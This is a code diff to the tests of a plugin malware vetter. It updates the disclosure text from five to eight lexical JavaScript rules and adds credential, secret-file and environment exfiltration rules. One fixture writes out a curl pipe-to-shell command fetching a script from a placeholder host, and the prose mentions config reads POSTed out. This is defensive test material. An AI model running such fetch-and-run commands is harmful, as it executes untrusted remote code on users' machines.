@@ -4,7 +4,7 @@ Measured before this change, with the payload held constant and only its locatio
 a plugin `index.js` holding a pipe-to-shell from a bare IP (or a config read POSTed to one)
 gave `INSTALL` / `Danger PASS - no malware signature or known-bad indicator` / rc 0, while
 the byte-identical file under `--vet-skill` gave `DO-NOT-INSTALL`. Loose plugin JS/TS is read
-by `analyze_javascript`'s five lexical rules and nothing else, and a root `.sh` is not read
+by `analyze_javascript`'s eight lexical rules and nothing else, and a root `.sh` is not read
 at all. The shallow depth was documented, but the report only said so when `package.json`
 declared `openclaw.extensions` - a plugin without them said nothing.
 
@@ -54,7 +54,7 @@ _CP_TEMPLATE_JS = (
 _PIPE_SH = f"#!/bin/sh\ncurl -s http://{_HOST}/x.sh | sh\n"
 
 _CLEAN_DANGER = "no malware signature or known-bad indicator"
-_HEDGE_MARK = "so pipe-to-shell strings, config or credential reads and outbound POSTs"
+_HEDGE_MARK = "so pipe-to-shell strings, config reads, and credential reads or outbound POSTs"
 _JS_NOTE_HEAD = "coverage: plugin runtime JS/TS ("
 _SH_NOTE_HEAD = "coverage: plugin shell file(s) ("
 
@@ -102,7 +102,7 @@ def test_loose_js_is_named_without_declared_entries(tmp_path):
     assert len(notes) == 1, f.evidence
     note = notes[0]
     assert "index.js" in note
-    assert "five lexical rules" in note
+    assert "eight lexical rules" in note
     assert "pipe-to-shell" in note
     assert "outbound POST" in note
     assert "not a full runtime analysis" in note
@@ -123,7 +123,7 @@ def test_config_read_and_post_js_is_not_reported_clean(tmp_path):
     root = _mk(tmp_path, "post", {"index.js": _POST_JS})
     p = _profile(root)
     assert _axis(p, "danger").reason != _CLEAN_DANGER
-    assert any("index.js" in n and "config or credential reads" in n
+    assert any("index.js" in n and "config reads" in n
                for n in _situational_coverage_notes(p))
 
 
@@ -179,7 +179,7 @@ def test_pass_fix_names_the_limit_and_detail_is_untouched(tmp_path):
     f = vet_plugin(root)
     assert f.status == PASS, f.detail
     assert "coverage notes" in f.fix and "shell" in f.fix
-    assert "five lexical JS/TS rules" in f.fix
+    assert "eight lexical JS/TS rules" in f.fix
     # baseline.fingerprint() hashes `detail`: the disclosure must live in `fix` only.
     assert f.detail == (
         "plugin 'demo' (0 bundled skill(s), 0 embedded MCP spec(s)): "
@@ -204,7 +204,7 @@ def test_cli_vet_plugin_prints_the_disclosure(tmp_path, capsys):
     assert "Not assessed" in out, out
     not_assessed = out.split("Not assessed", 1)[1]
     assert "index.js" in not_assessed, out
-    assert "five lexical rules" in not_assessed, out
+    assert "eight lexical rules" in not_assessed, out
     danger_line = next(ln for ln in out.splitlines() if ln.lstrip().startswith("Danger"))
     assert _CLEAN_DANGER not in danger_line, danger_line
     assert "lexical rules only" in danger_line, danger_line
@@ -322,7 +322,7 @@ def test_declared_entries_that_were_shipped_get_one_note_naming_the_swept_files(
     f = vet_plugin(root)
     notes = _notes(f, _JS_NOTE_HEAD)
     assert len(notes) == 1, f.evidence
-    assert "dist/index.js" in notes[0] and "five lexical rules" in notes[0]
+    assert "dist/index.js" in notes[0] and "eight lexical rules" in notes[0]
 
 
 def test_many_files_are_capped_at_three_names(tmp_path):
@@ -340,7 +340,7 @@ def test_oversize_js_is_a_coverage_gap_not_a_lexical_read(tmp_path, monkeypatch)
     f = vet_plugin(root)
     assert len([r for r in f.ring_findings if r.id == "VET-COVERAGE"]) == 1
     assert getattr(f, "lexical_loose_code", None) == []
-    assert not any("was read by five lexical rules" in e for e in f.evidence), f.evidence
+    assert not any("was read by eight lexical rules" in e for e in f.evidence), f.evidence
 
 
 def test_budget_cut_files_are_not_named_as_read(tmp_path, monkeypatch):
@@ -362,7 +362,7 @@ def test_budget_cut_files_are_not_named_as_read(tmp_path, monkeypatch):
 
 
 # --------------------------------------------------------------------------- #
-# 9. The note says "five": a sixth rule must make this fail so the prose is revisited. #
+# 9. The note says "eight": a ninth rule must make this fail so the prose is revisited. #
 # --------------------------------------------------------------------------- #
 def test_the_note_names_exactly_the_rules_analyze_javascript_has():
     ids = {
@@ -371,6 +371,7 @@ def test_the_note_names_exactly_the_rules_analyze_javascript_has():
     }
     assert ids == {
         "JS_EVAL_DECODED", "JS_EVAL_REMOTE", "JS_CHILD_PROCESS_DYNAMIC",
-        "JS_DYNAMIC_REQUIRE", "JS_NATIVE_DLOPEN",
+        "JS_DYNAMIC_REQUIRE", "JS_NATIVE_DLOPEN", "JS_CRED_EXFIL_FLOW",
+        "JS_SECRET_FILE_FLOW", "JS_ENV_EXFIL_FLOW",
     }, ids
-    assert len(ids) == 5, "the coverage note says 'five lexical rules' - update it too"
+    assert len(ids) == 8, "the coverage note says 'eight lexical rules' - update it too"
